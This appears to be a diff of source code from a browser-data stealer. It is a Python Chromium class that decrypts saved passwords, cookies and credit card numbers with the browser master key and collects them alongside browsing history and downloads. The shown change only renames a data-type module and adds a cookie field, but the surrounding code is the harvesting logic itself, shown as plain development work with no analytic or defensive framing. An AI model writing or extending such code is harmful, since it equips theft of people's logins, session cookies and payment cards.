@@ -156,7 +156,7 @@ class Chromium:
                 continue
 
             password = self.decrypt_password(row[2], self.master_key)
-            login = DataTypes.Login(row[0], row[1], password)
+            login = BrowserTypes.Login(row[0], row[1], password)
             self.chromium_passwords.append(login.conv())
 
         conn.close()
@@ -195,7 +195,7 @@ class Chromium:
                 continue
 
             value = self.decrypt_password(row[3], self.master_key)
-            cookie = DataTypes.Cookie(row[0], row[1], row[2], value, row[4])
+            cookie = BrowserTypes.Cookie(row[0], row[1], row[2], value, bool(row[4]), row[4])
             self.chromium_cookies.append(cookie.conv())
 
         conn.close()
@@ -233,7 +233,7 @@ class Chromium:
             if not row[0] or not row[1] or not row[2]:
                 continue
 
-            site = DataTypes.Site(row[0], row[1], row[2])
+            site = BrowserTypes.Site(row[0], row[1], row[2])
             self.chromium_history.append(site.conv())
 
         conn.close()
@@ -271,7 +271,7 @@ class Chromium:
             if not row[0] or not row[1]:
                 continue
 
-            download = DataTypes.Download(row[0], row[1])
+            download = BrowserTypes.Download(row[0], row[1])
             self.chromium_downloads.append(download.conv())
 
         conn.close()
@@ -310,7 +310,7 @@ class Chromium:
                 continue
 
             card_number = self.decrypt_password(row[3], self.master_key)
-            card = DataTypes.Card(row[0], row[1], row[2], card_number, row[4])
+            card = BrowserTypes.Card(row[0], row[1], row[2], card_number, row[4])
             self.chromium_banking.append(card.conv())
 
         conn.close()
